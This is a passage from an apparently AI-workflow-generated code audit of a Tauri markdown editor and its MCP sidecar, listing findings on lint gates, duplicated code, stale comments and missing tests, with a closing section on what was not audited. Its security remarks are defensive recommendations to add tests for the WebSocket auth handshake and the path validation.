**Recommendation:** Three steps: (1) set `ignoreExportsUsedInFile: true` to silence the website-demo false positives; (2) prune the real dead exports/types (mostly barrel re-exports in plugins/*/index.ts, lib/formats/index.ts, settingsStore.ts); (3) ratchet `exports`/`types` to "error" so the gate holds the line, mirroring the project's coverage-ratchet culture. Remove the two stale ignore entries knip itself flags.

### #71 · P2/S · eslint gate accepts unlimited warnings — no-explicit-any and prefer-const are decorative; adding --max-warnings 0 is free today

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `package.json:25`
- `eslint.config.js:24`

**Evidence:** package.json:25 is `"lint": "eslint src"` with no `--max-warnings`, so the two warn-level rules (eslint.config.js:24-25: `no-explicit-any: warn`, `prefer-const: warn`) can never fail check:all — warnings accumulate silently. I ran `pnpm exec eslint src` and it currently produces zero output: zero errors AND zero warnings (the only two production `as any` sites, src/plugins/compositionGuard/tiptap.ts:340 and src/lib/formats/adapters/yaml.tsx:176, already carry justified eslint-disable-next-line comments). The codebase has earned a hard gate; today it costs nothing to install.

**Recommendation:** Change the script to `eslint src --max-warnings 0`. Zero code changes required now; future `any` or `let`-that-should-be-`const` either gets fixed or carries an explicit per-line suppression with justification, matching the repo's documented-suppression convention.

### #72 · P2/M · ADR-013 'utils must be leaf-pure' is unenforced for Tauri imports — 14 utils files violate it and the drift can keep growing

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #61

**Files:**
- `.dependency-cruiser.cjs:22`
- `src/utils/clipboardImagePath.ts`
- `src/utils/largeFilePrompts.ts:25`
- `src/utils/secureStorage.ts`

**Evidence:** AGENTS.md's three-tier table says src/utils may import only 'stdlib, other utils/' and explicitly: 'If you find yourself adding @tauri-apps/* imports inside utils/, the file belongs in services/'. The dep-cruiser `leaf-modules-stay-pure` rule (.dependency-cruiser.cjs:22-55) only forbids utils → src/{plugins,components,stores} — it says nothing about @tauri-apps. Verified by grep: 14 non-test files in src/utils import @tauri-apps (clipboardImagePath, crashRecovery, debug.ts + debug/{error,warn,internals}, errorDialog, imageHashRegistry, largeFilePrompts, linkOpen, orphanAssetCleanup, pdfExportWindow, secureStorage, settingsWindow). Nothing stops file 15.

**Recommendation:** Add a dep-cruiser forbidden rule `from: ^src/utils/` → `to: node_modules/@tauri-apps` (severity error) with the current 14 files in a pathNot exemption list, mirroring the existing exemption pattern in rule 3. This freezes the drift at zero cost; migrate exempted files to services/ opportunistically (debug/* may instead warrant an explicit documented exemption since utils consumers need the loggers).

### #73 · P3/S · Copy-paste duplication cluster: formatFileSize (drifted twin, one production-dead), basename vs getFileName, escapeRegExp, clamp x3

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/export/resourceResolver.ts:441`
- `src/utils/fileSizeThresholds.ts:60`
- `src/utils/largeFilePrompts.ts:30`
- `src/plugins/search/tiptap.ts:60`
- `src/utils/sourceEditorSearch.ts:15`

**Evidence:** (1) `formatFileSize` exists twice with drifted behavior: fileSizeThresholds.ts:60-69 has NaN/negative guards, a GB tier, and Finder-style precision; resourceResolver.ts:441-446 has none of those and caps at MB — and has zero production call sites (only its own test at resourceResolver.test.ts:954 uses it). (2) largeFilePrompts.ts:30-33 defines a private `basename` that is byte-for-byte the same Math.max(lastIndexOf) algorithm as pathUtils.ts:19-23 `getFileName`. (3) `escapeRegExp` is defined identically in search/tiptap.ts:60 (private) and sourceEditorSearch.ts:15 (exported). (4) `clamp` is re-implemented in cursorSync/table.ts:150, WorkflowPanelShell.tsx:34, SplitPaneEditor.tsx:49.

**Recommendation:** Delete resourceResolver's formatFileSize (and its test block) and import from fileSizeThresholds; replace largeFilePrompts' basename with pathUtils.getFileName; have search/tiptap.ts import escapeRegExp from sourceEditorSearch (or hoist to utils); optionally add a generic clamp to utils. All are mechanical one-session changes that remove behavioral-drift risk.

### #74 · P3/S · Raw navigator.platform sniffing in 5 files bypasses utils/platform.ts, whose stated purpose is to centralize exactly this

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/platform.ts:1`
- `src/pages/settings/FilesImagesSettings.tsx:37`
- `src/components/StatusBar/StatusBar.tsx:309`
- `src/components/Sidebar/FileExplorer/ContextMenu.tsx:123`
- `src/components/Terminal/spawnPty.ts:175`
- `src/utils/pathUtils.ts:68`

**Evidence:** utils/platform.ts's header says 'Purpose: centralize the navigator.platform sniffing that several UI surfaces use', exporting isMacPlatform()/isWindowsPlatform() (case-insensitive regex, test-overridable). Yet FilesImagesSettings.tsx:37 uses `navigator.platform.includes("Mac")`, StatusBar.tsx:309 the same inline, ContextMenu.tsx:123 `navigator.platform.toLowerCase()`, spawnPty.ts:175 `navigator.platform.startsWith("Win")`, pathUtils.ts:68 another toLowerCase() — five independent sniffs with subtly different matching (includes vs regex vs startsWith). Other settings pages (Settings.tsx:122, AdvancedSettings.tsx:49, TerminalSettings.tsx:83) already use isMacPlatform(), so the codebase is split between two patterns for the same job.

**Recommendation:** Replace the five raw sniffs with isMacPlatform()/isWindowsPlatform() (add an isLinuxPlatform or platform() helper if ContextMenu/pathUtils need the third branch). Optionally add a lint grep (like lint-console.sh) banning `navigator.platform` outside utils/platform.ts.

### #75 · P3/S · Sidecar version constants: misleading 'injected at build time' comment, duplicated '0.1.0' protocol version, and stale rule-40 doc reference

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/cli.ts:20`
- `vmark-mcp-server/src/cli.ts:470`
- `vmark-mcp-server/src/server.ts:60`
- `vmark-mcp-server/src/index.ts:122`
- `.claude/rules/40-version-bump.md`

**Evidence:** cli.ts:20-21 comments `// Package version (injected at build time or read from package.json)` above `const VERSION = '0.8.4'` — it is neither injected nor read; it's manually sed-rewritten by scripts/bump-version.sh:28. The MCP protocol version `'0.1.0'` is hardcoded independently at server.ts:60 (`config.version ?? '0.1.0'`) and cli.ts:470 (McpServer constructor) with no sync mechanism. index.ts:122-125 documents EXPECTED_TOOL_COUNT with 'Update this number whenever tools are added or removed' but it is *derived* via reduce over TOOL_CATEGORIES (cli.ts:68's error message repeats the stale instruction). rule 40-version-bump.md claims useMcpHealthCheck.ts 'reads from MCP_VERSION constant' — grep shows no MCP_VERSION exists anywhere; the hook reads the version from sidecar health-check output. In a repo where rules files steer AI agents, stale rule text causes wrong edits.

**Recommendation:** Fix the cli.ts:20 comment to name bump-version.sh as the writer (or actually inject from package.json at esbuild time); hoist '0.1.0' to one shared constant used by both server.ts and cli.ts; rewrite the EXPECTED_TOOL_COUNT doc comments to say 'update TOOL_CATEGORIES'; correct the MCP_VERSION sentence in rule 40.

### #76 · P3/M · 300-line file cap drift: 29 non-test files exceed 450 lines, worst offenders 2-2.5x over the repo's signature convention

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/stores/uiStore.ts`
- `src/plugins/codePreview/tiptap.ts`
- `src/components/Editor/TiptapEditor.tsx`
- `src/pages/settings/components.tsx`

**Evidence:** AGENTS.md mandates 'Keep code files under ~300 lines (split proactively)'. wc -l over non-test src TS/TSX shows 115 files over 300 lines and 29 over 450 — the worst: uiStore.ts 759, codePreview/tiptap.ts 724, TiptapEditor.tsx 685, settings/components.tsx 621, StepForm.tsx 588, popupStore.ts 586, mutators.ts 578, MathInlineNodeView.ts 565, UniversalToolbar.tsx 551. Nothing machine-checks the cap (check:all has no line-count gate), so the convention erodes exactly where the code is densest. Several (uiStore, popupStore) are deliberate T09 slice consolidations, but no exemption is recorded anywhere a tool can read.

**Recommendation:** Either (a) add a soft line-count gate script to check:all (error >450, with a named exemption list for the deliberate consolidations like uiStore/popupStore), or (b) split the top non-exempt offenders (codePreview/tiptap.ts and TiptapEditor.tsx have natural seams: preview helpers and load/serialize hooks). Option (a) freezes the drift in one session.

## Testing gaps

The coverage ratchet exists but key security and data-integrity boundaries have zero tests, and the ledger cites a compensating control that does not run.

### #77 · P1/S · Markdown serializer silently drops unknown ProseMirror node types — no schema-completeness test guards the round-trip

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #58

**Files:**
- `src/utils/markdownPipeline/proseMirrorToMdast.ts:175`
- `src/utils/markdownPipeline/proseMirrorToMdast.ts:187`
- `src/services/assembly/tiptapExtensions.ts`

**Evidence:** proseMirrorToMdast.ts's block-node switch (lines 122-179) covers a hardcoded list of node names; the default arm (175-178) returns null with only a dev-mode mdPipelineWarn — the node's content is dropped from the serialized markdown, which runs on every edit and before every save. convertInlineContent (187-209) is worse: unknown inline node types are skipped with no warning at all, and the whole if-chain is wrapped in '/* v8 ignore start */'. The assembled schema comes from ~50 extensions in services/assembly/tiptapExtensions.ts (which has no test file; only modeSwitchCleanup.test.ts and sourceEditorExtensions.test.ts exist in src/services/assembly/). No test enumerates the real schema's node types against the converter switch — I grepped markdownPipeline tests for any schema.nodes enumeration/completeness test and found only per-node unit tests. A contributor adding a new Tiptap node (the codebase adds them regularly: detailsBlock, alertBlock, video_embed, toc...) who forgets the PM→MDAST converter ships silent user-data loss that no existing test catches.

**Recommendation:** Add a completeness test in src/utils/markdownPipeline/__tests__/ that builds the real schema via @tiptap/core's getSchema() over the production extension list from services/assembly/tiptapExtensions.ts (the getSchema pattern is already used in src/plugins/taskToggle/tiptap.test.ts and latex/tiptapInlineMath.test.ts), then asserts every node type name is either (a) present in the proseMirrorToMdast converter switch (export the handled-name set or drive both from one const array), or (b) on an explicit, commented allowlist of view-only nodes. Mirror the same assertion for inline types handled by convertInlineContent. This converts the 'lossy-by-omission' failure mode from silent to red-test.

### #78 · P1/M · vmark-mcp-server test suite is never run by any CI workflow, and the shipped 5-tool surface (tools/*.ts, 469 LOC) plus cli.ts (553 LOC) have zero tests

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #53, #68

**Files:**
- `.github/workflows/ci.yml:51`
- `vmark-mcp-server/vitest.config.ts`
- `vmark-mcp-server/src/cli.ts`
- `vmark-mcp-server/src/tools/document.ts`
- `.github/workflows/release.yml:182`

**Evidence:** ci.yml's frontend-run only executes root `pnpm check:all`, whose `vitest run --coverage` uses the root vitest.config.ts (include: 'src/**' only). The rust paths-filter watches src-tauri/** and Cargo.lock. release.yml builds the sidecar and runs `--health-check` but never `pnpm test` (verified lines 170-200). So a PR touching only vmark-mcp-server/** runs zero relevant tests. Worse, the sidecar's 6 test files import only server.js, websocket.js, mcpAdapters.js, parentProcess.js, and types (verified by grepping all `from '...src/...'` imports in __tests__/) — nothing imports src/tools/*.ts (document/workspace/workflow/selection/session: the product's headline AI surface, including the save:false forwarding semantics and arg-validation branches in document.ts lines 61-106) or src/cli.ts (port-file `{port}:{token}` parsing, per-OS app-data path resolution duplicated from Tauri, JSON-Schema→Zod conversion, client-identity sniffing). The sidecar's own vitest.config.ts declares 90/70/90/90 thresholds, but since no workflow ever runs the suite, the gate is dead.

**Recommendation:** Two steps: (1) add `pnpm --dir vmark-mcp-server test:coverage` to ci.yml's frontend-run job (or to check:all) so the existing suite and its thresholds actually gate PRs; (2) write unit tests for src/tools/*.ts (each handler: action dispatch, missing-arg error results, the `save === false ? false : undefined` forwarding rule, bridge-request payload shapes — MockBridge already exists in __tests__/mocks/) and for cli.ts's pure parts (port-file parsing including malformed/missing files, getAppDataDir per-platform branches, the schema-to-zod converter).

### #79 · P1/M · Coverage-ratchet ledger repeatedly cites 'the live Tauri MCP smoke' as the compensating control, but smoke.mjs covers none of the cited paths and is not run in CI

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vitest.config.ts:52`
- `vitest.config.ts:210`
- `vitest.config.ts:231`
- `vitest.config.ts:279`
- `e2e/smoke.mjs`

**Evidence:** Six threshold-relaxation entries in vitest.config.ts (lines 52, 210, 231, 241, 274, 279) justify lowering coverage with 'the live Tauri MCP smoke covers them in the real webview' / 'integration smoke covers them' — covering GhaWorkflowSidePanel.handleSave disk-persistence branches, the snapshotRoot html-to-image capture path, workflow-form integration, YAML linter async branches, and useWorkflowExecution/ApprovalDialog paths. But e2e/smoke.mjs (the only e2e artifact; e2e/ contains just smoke.mjs + README + artifacts) performs exactly 6 generic steps: connect to the 9323 bridge, list_windows, probe .ProseMirror, execCommand-insert a marker, read textContent back, screenshot. It never opens a file, saves, switches to source mode, or touches any workflow/GHA/linter surface. No workflow in .github/workflows/ invokes e2e:smoke (grepped; only the bench 'smoke' comment matches), and the README states it needs a headed live build. The project's own convention (per the ratchet-ledger discipline) treats these comments as normative; ~1.5 pp of accumulated relaxation rests on a compensating control that does not exist.

**Recommendation:** Extend e2e/smoke.mjs (or add sibling scenario scripts under e2e/) to actually exercise the most-cited paths: open a real workflow YAML fixture, edit via the GHA side panel, save, and assert the file content on disk; switch WYSIWYG↔source mode and assert content survives. The bridge's execute_js primitive is sufficient for all of these. Where a path genuinely can't be smoked, rewrite the ledger entry to name the real (absent) backstop so the ratchet TODOs stay honest. Optionally run the smoke on a macOS runner with a debug build in a scheduled workflow so it can't rot.

### #80 · P1/M · MCP wire contract is string-duplicated across three files (sidecar TS, frontend TS, Rust read/write allowlist) with no parity test — the exact #925 regression can recur silently

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #55, #60, #69

**Files:**
- `vmark-mcp-server/src/bridge/core-types.ts:28`
- `src/hooks/mcpBridge/v2/dispatch.ts:53`
- `src-tauri/src/mcp_bridge/state.rs:181`
- `scripts/extract-menu-ids.ts`

**Evidence:** The vmark.* request types are independently maintained in core-types.ts (15-type union, lines 28-59), dispatch.ts's switch, and state.rs::is_read_only_operation (lines 181-229). The Rust tests (state.rs lines 264+) only assert that currently-listed strings classify correctly — they structurally cannot catch a NEW read type added in TS but omitted from Rust, which is precisely regression #925's failure mode (every concurrent client read silently serializes through the global WRITE_LOCK; comment at state.rs:220-223 documents this). state.rs also still allowlists ~25 legacy document.*/structure.*/genies.* types the frontend no longer dispatches (dead strings that mask diff review). The repo already has the exact countermeasure pattern for menu IDs: scripts/extract-menu-ids.ts generates src/shared/menu-ids.json from Rust source and actionRegistry.test.ts validates the TS side against it.

**Recommendation:** Create a single wire-contract manifest (e.g. shared/mcp-wire-types.json listing each vmark.* type plus its read/write classification). Add (a) a TS test asserting core-types.ts's union members and dispatch.ts's handled cases equal the manifest, and (b) a Rust test (include_str! the JSON) asserting is_read_only_operation returns true for exactly the manifest's read types among vmark.* entries. While there, prune the ~25 dead legacy type strings from state.rs so the allowlist matches the shipped 5-tool surface.

### #81 · P2/M · Blanket '**/index.ts' coverage exclusion hides 1,200+ lines of logic-bearing files (including security-relevant image path validation) from the razor-thin coverage ratchet

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vitest.config.ts:35`
- `src/plugins/imageView/index.ts`
- `src/plugins/mermaid/index.ts`
- `src/lib/ghaWorkflow/parser/index.ts`
- `src/plugins/cjkLetterSpacing/index.ts`

**Evidence:** vitest.config.ts excludes '**/index.ts' from coverage (line 35), intended for re-export barrels. But several index.ts files are full implementations: src/plugins/imageView/index.ts is a 311-line NodeView containing resolveImageSrc with directory-traversal validation (validateImagePath rejection path at ~line 58), mermaid/index.ts (283 lines), lib/ghaWorkflow/parser/index.ts (241), markmap/index.ts (220), cjkLetterSpacing/index.ts (214), hooks/mcpBridge/index.ts. These never enter the coverage denominator, so the project's signature managed ratchet (buffers of 0.02-0.10 pp, ledger-documented) simply cannot see regressions in them — tests like imageView/tiptap.test.ts do import ImageNodeView from './index', but the measurement is discarded. Given the RW-15 ledger entry explicitly treats 'first measured' files as scope expansions worth documenting, this is an unmeasured blind spot inconsistent with the project's own gate philosophy.

**Recommendation:** Replace the blanket '**/index.ts' exclude with the precise barrel form (e.g. keep excluding only index.ts files that are pure re-exports, via an explicit list, or rename the logic-bearing ones — imageView/index.ts → imageView/ImageNodeView.ts etc., re-exporting from a thin index.ts). Take the resulting threshold hit as a documented ledger entry per convention, with ratchet-back TODOs for the now-visible files.

### #82 · P2/M · mcp_bridge/server.rs (880 LOC) has zero tests — including the auth handshake that is the only security boundary on the localhost MCP WebSocket

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/mcp_bridge/server.rs:200`
- `src-tauri/src/mcp_bridge/server.rs:262`

**Evidence:** grep for #[test]/#[tokio::test] in server.rs returns 0 (state.rs has 36 by contrast). handle_connection (line 200) inlines the entire auth phase (lines 262-330): 10s timeout, auth-must-be-first-message enforcement, rejection of 'identify' before auth, invalid-token disconnect, unknown-first-message rejection. Any local process can connect to this port; the token check is the sole gate. A regression that lets a non-auth first message through, or that skips the disconnect on Ok(Ok(false)), would not be caught by anything — the e2e smoke deliberately never touches this port (it uses the 9323 automation bridge), and the sidecar's websocket.test.ts tests only the client side against a mock.

**Recommendation:** Extract the auth-phase decision into a pure function (first WsMessage + expected_token → Authenticated | Rejected(reason)) and unit test all branches (valid token, wrong token, identify-before-auth, non-auth message, malformed JSON). Then add one tokio integration test that binds a real TcpListener, runs handle_connection's accept/auth loop against a tokio-tungstenite client, and asserts: no token → disconnected after rejection; valid token → auth_result success. The project already uses tauri::test::MockRuntime elsewhere for AppHandle-dependent tests.

### #83 · P2/S · Frontend tests cannot detect Tauri command-name or payload drift: invoke is a bare vi.fn() and no gate checks invoke() literals against the ~92 Rust commands

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/test/setup.ts:128`
- `src-tauri/src/lib.rs`
- `scripts/extract-menu-ids.ts`

**Evidence:** src/test/setup.ts:128-130 mocks @tauri-apps/api/core with `invoke: vi.fn()` — any command string is accepted and resolves undefined, so a typo'd or renamed command (lib.rs registers ~92 in one generate_handler!) passes the entire 846-file frontend suite and only fails at runtime in the packaged app. The scripts/ directory has no invoke-parity check (verified: no script greps tauri::command or generate_handler). The repo already maintains two cross-language string contracts with automated parity (shared/menu-ids.json via extract-menu-ids.ts + actionRegistry.test.ts; SUPPORTED_EXTENSIONS via check-ext-sync.sh), so this third contract — the largest one — is the odd one out.

**Recommendation:** Add scripts/check-invoke-commands.sh (or .ts) to check:all: extract `fn <name>` names following #[tauri::command] across src-tauri/src/**, extract every string literal passed as the first arg to invoke( in src/**, and fail on TS-side names missing from the Rust set (allowlist plugin-prefixed `plugin:*|*` invocations). Same shape and cost as the existing check-ext-sync.sh gate.

### #84 · P2/M · pty.rs (399 LOC) has zero tests despite carrying the two-phase spawn race fix, Condvar pause/resume, and Drop-kills-children lifecycle for the terminal feature

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/pty.rs`

**Evidence:** grep for #[test]/#[tokio::test] in src-tauri/src/pty.rs returns 0, while sibling risk modules are well covered (quit.rs 37 tests, window_manager.rs 46, watcher.rs 16, hot_exit/* ~70). pty.rs replaces tauri-plugin-pty with hand-rolled session management: a two-phase pty_spawn/pty_start protocol that exists specifically to avoid an output-loss race, per-session reader threads, Condvar-based pause/resume, and a Drop impl that must kill child processes (a leak here orphans shells on every window close). The frontend side mocks @/lib/pty entirely (setup.ts:201), and the e2e smoke never opens the terminal — so the PTY lifecycle has no automated verification anywhere in the 3-OS CI matrix.

**Recommendation:** Add in-file unit tests for the session-registry state machine (spawn registers, start transitions, double-start rejected, exit cleans up) using a real portable-pty spawning /bin/cat or `sh -c 'echo ok'` under #[cfg(unix)] (macOS/Linux CI legs), plus a pause/resume test asserting buffered output is delivered after resume — that's the two-phase race contract. Gate Windows-fragile cases with cfg, consistent with the project's existing 'tests cfg'd off on Windows' convention.

### #85 · P2/S · Hot-exit schema migrations are deliberately implemented twice (TS + Rust) but parity rests on comment discipline — fixtures are duplicated per language, with no shared golden files or version-parity check

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/services/persistence/hotExit/schemaMigration.ts:7`
- `src-tauri/src/hot_exit/migration.rs:5`
- `src/services/persistence/hotExit/types.ts:8`
- `src-tauri/src/hot_exit/session.rs:11`

**Evidence:** Both file headers state 'Dual migration by design... Both must be kept in sync when adding new schema versions' — sync is enforced by nothing. SCHEMA_VERSION = 3 is independently declared in types.ts:8 and session.rs:11. The v1/v2 session fixtures are written inline in each language's tests (schemaMigration.test.ts lines 95+/235+; migration_v3_tests.rs lines 5-6/125-131) rather than shared, so the two suites can silently diverge on what a 'v2 session' even looks like. Hot exit is the layer where divergence equals unsaved-document loss on restart: Rust migrates disk sessions at startup, TS migrates in-memory capture — a v4 added on one side only would pass both suites green.

**Recommendation:** Move the version fixtures to shared JSON files (e.g. shared/fixtures/hot-exit/session-v1.json, -v2.json, -v3.json); have schemaMigration.test.ts import them and migration tests in Rust include_str! them, each asserting migration to current produces the expected v3 shape. Add a one-line parity assertion that both SCHEMA_VERSION constants match the fixture set's max version (the Rust test can include_str! types.ts and regex the constant, mirroring the menu-ids extraction approach).

## Not covered (audit these separately)

- **UX / accessibility / i18n** — finder failed on a transient socket error.
  Planned scope: keyboard reachability, ARIA, 10-locale completeness,
  hardcoded strings, theme consistency, shortcut discoverability.
- **Build / DX / CI** — rate-limited. Planned scope: vite/tsconfig/eslint/knip
  config, CI caching and matrix, release automation, dev-loop speed.
- **Dependencies** — rate-limited. Planned scope: outdated majors, duplicate
  deps, advisories (`pnpm audit`, `cargo tree -d`).
- **Adversarial verification** of the 81 finder-evidence items.
- **Completeness critic** (gap detection beyond the 12 planned dimensions).

The workflow run is resumable (`wf_228c134f-93d`) once the provider weekly
limit resets (17:00 Asia/Shanghai, 2026-06-12): completed agents return
cached results; only the failed verification/dedup/critic/finder agents
re-run.
